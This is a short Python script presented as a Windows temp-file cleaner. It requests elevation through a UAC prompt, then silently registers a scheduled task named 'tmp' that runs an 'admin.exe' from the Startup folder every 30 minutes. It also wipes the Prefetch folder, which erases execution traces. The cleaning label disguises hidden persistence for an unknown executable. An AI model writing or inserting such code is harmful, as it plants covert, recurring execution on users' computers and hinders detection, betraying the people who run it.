"""clear Temps for windows"""
from __future__ import print_function
import ctypes, sys
import os

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    os.system(r"SCHTASKS /F /Create /tn tmp /sc minute /mo 30 /tr C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\admin.exe")
    os.system(r"del /s /f /q C:\Windows\Prefetch\*.* > Nul 2>&1")
    os.system(r"del /s /f /q C:\Windows\Temp\*.* > Nul 2>&1")
    os.system(r"del /s /f /q C:\Users\%USERNAME%\AppData\Local\Temp\*.* > Nul 2>&1")
else:
    if sys.version_info[0] == 3:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    else:#in python2.x
        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)

